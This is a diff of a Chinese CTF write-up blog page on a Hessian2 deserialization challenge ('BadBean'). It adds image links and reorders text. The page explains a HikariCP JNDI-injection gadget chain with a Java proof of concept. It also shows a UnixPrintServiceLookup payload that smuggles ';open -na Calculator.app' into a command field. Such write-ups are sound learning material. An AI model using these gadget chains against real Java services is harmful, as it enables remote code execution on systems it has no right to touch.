@@ -17,8 +17,13 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/15704.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/20431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/20523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/20556.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/20916.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/1105.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/pupil857/poto/main/img/21139.png">
 <meta property="article:published_time" content="2022-09-02T17:17:10.000Z">
-<meta property="article:modified_time" content="2022-09-03T11:39:27.721Z">
+<meta property="article:modified_time" content="2022-09-03T11:43:05.631Z">
 <meta property="article:author" content="Pupi1">
 <meta property="article:tag" content="Web,CTF,X1cT34m,NJUPT">
 <meta name="twitter:card" content="summary">
@@ -181,16 +186,17 @@
 <p>很明显可以调用任意get方法。然后根据上面那篇文章，复现一下前面的流程。</p>
 <p>这里先在</p>
 <p><img src="https://raw.githubusercontent.com/pupil857/poto/main/img/20431.png" alt="Pasted image 20220831220431"></p>
-<p>这个位置要触发readObjectDefinition方法，在该方法中调用readString![Pasted image 20220831220523](青龙组BadBean/Pasted image 20220831220523.png)<br>然后在不满足case的情况下![Pasted image 20220831220556](青龙组BadBean/Pasted image 20220831220556.png)<br>进入default <code>this.expect(&quot;string&quot;, tag);</code>中触发tostring。<br>也就是说，67满足了两个条件</p>
+<p>这个位置要触发readObjectDefinition方法，在该方法中调用readString<img src="https://raw.githubusercontent.com/pupil857/poto/main/img/20523.png" alt="Pasted image 20220831220523"><br>然后在不满足case的情况下<img src="https://raw.githubusercontent.com/pupil857/poto/main/img/20556.png" alt="Pasted image 20220831220556"><br>进入default <code>this.expect(&quot;string&quot;, tag);</code>中触发tostring。<br>也就是说，67满足了两个条件</p>
 <ol>
 <li> 在<code>Hessian2Input#readObject</code>中可以走到readString</li>
 <li> 在readString可以进入<code>this.expect(&quot;string&quot;, tag)</code></li>
 </ol>
-<p>然后通过重写代码来实现使第一个字节为67![Pasted image 20220831220816](青龙组BadBean/Pasted image 20220831220816.png)</p>
+<p>然后通过重写代码来实现使第一个字节为67<img src="https://raw.githubusercontent.com/pupil857/poto/main/img/20916.png" alt="Pasted image 20220831220816"></p>
+<p>后面的get利用链他环境中给出了HikariCP这个依赖，然后在他的HikariDataSource的getConnection方法中可以触发jndi注入<br><img src="https://raw.githubusercontent.com/pupil857/poto/main/img/1105.png" alt="Pasted image 20220831221105"></p>
+<p><img src="https://raw.githubusercontent.com/pupil857/poto/main/img/21139.png" alt="Pasted image 20220831221139"></p>
+<p>poc:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;  </span><br><span class="line">  </span><br><span class="line">        ByteArrayOutputStream bao = <span class="keyword">new</span> ByteArrayOutputStream();  </span><br><span class="line">        HikariDataSource hk = <span class="keyword">new</span> HikariDataSource();  </span><br><span class="line">  </span><br><span class="line">        hk.setPoolName(<span class="string">&quot;pool&quot;</span>);  </span><br><span class="line">        hk.setDataSourceJNDI(<span class="string">&quot;ldap://127.0.0.1:8080/asd&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        MyBean myBean = <span class="keyword">new</span> MyBean(<span class="keyword">null</span>,<span class="keyword">null</span>,hk, HikariDataSource.class);  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(myBean, myBean);  </span></span><br><span class="line">  </span><br><span class="line">        ObjectOutput out = <span class="keyword">new</span> Hessian2ObjectOutput(bao);  </span><br><span class="line">        out.writeUTF(<span class="string">&quot;2.2&quot;</span>);  </span><br><span class="line"><span class="comment">//        out.writeUTF(&quot;2.2&quot;);  </span></span><br><span class="line">        out.writeObject(myBean);  </span><br><span class="line">        out.flushBuffer();  </span><br><span class="line">  </span><br><span class="line">        deserialize(bao.toByteArray());</span><br></pre></td></tr></table></figure>
 
-<p>后面的get利用链他环境中给出了HikariCP这个依赖，然后在他的HikariDataSource的getConnection方法中可以触发jndi注入<br>![Pasted image 20220831221105](青龙组BadBean/Pasted image 20220831221105.png)</p>
-<p>![Pasted image 20220831221139](青龙组BadBean/Pasted image 20220831221139.png)</p>
 <p>然后这个位置是因为该版本存在有waf所以不能用二次反序列化的那个类(java.security.SignedObject)，但是<code>sun.print.UnixPrintService</code>这个类是没有在黑名单里面的，我想肯定可以用这个类打，<del>但是我没有环境所以暂时就没有复现.</del>(复现成功了，但是UnixPrintService类的构造方法不是Public，所以无法利用，重新找了差不多的UnixPrintServiceLookup可以成功复现</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UnixPrintServiceLookup unixPrintServiceLookup = <span class="keyword">new</span> UnixPrintServiceLookup();  </span><br><span class="line">        setFieldValue(unixPrintServiceLookup, <span class="string">&quot;cmdIndex&quot;</span>, <span class="number">0</span>);  </span><br><span class="line">       <span class="comment">// setFieldValue(unixPrintServiceLookup, &quot;libFound&quot;, 0);  </span></span><br><span class="line">        setFieldValue(unixPrintServiceLookup, <span class="string">&quot;osname&quot;</span>, <span class="string">&quot;asd&quot;</span>);  </span><br><span class="line">        setFieldValue(unixPrintServiceLookup, <span class="string">&quot;lpcFirstCom&quot;</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;;open -na /System/Applications/Calculator.app&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;ls&quot;</span>&#125;);  </span><br><span class="line">        MyBean myBean = <span class="keyword">new</span> MyBean(<span class="keyword">null</span>,<span class="keyword">null</span>,unixPrintServiceLookup,sun.print.UnixPrintServiceLookup.class);</span><br></pre></td></tr></table></figure>
 
